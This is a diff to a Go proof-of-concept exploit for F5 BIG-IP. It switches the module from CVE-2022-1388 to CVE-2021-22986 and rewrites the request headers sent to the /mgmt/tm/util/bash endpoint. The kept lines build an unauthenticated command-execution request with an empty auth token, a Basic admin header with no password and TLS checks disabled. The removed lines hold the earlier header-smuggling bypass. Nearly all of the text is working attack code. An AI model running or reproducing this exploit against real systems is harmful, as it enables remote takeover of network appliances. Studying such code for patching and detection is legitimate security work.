@@ -1,4 +1,4 @@
-package cve_2022_1388
+package cve_2021_22986
 
 import (
 	"fmt"
@@ -29,19 +29,14 @@ func Poc(urlInput, command, vul string) {
 	} else {
 		color.Green("[+] Start test vul: %s on target: %s; command: %s", vul, urlBase, command)
 	}
-
 	urlIndex := urlBase + "/mgmt/tm/util/bash"
 	client := req.C()
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
-	// client.SetProxyURL("http://127.0.0.1:8080")
 	customHeader := map[string]string{
-		"Host":            "localhost",
-		"User-Agent":      "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
-		"Content-type":    "application/json",
-		"Connection":      "close,X-F5-Auth-Token",
-		"X-F5-Auth-Token": "anything",
+		"X-F5-Auth-Token": "",
 		"Authorization":   "Basic YWRtaW46",
+		"Content-Type":    "application/json",
 	}
 	payload := map[string]string{
 		"command":     "run",
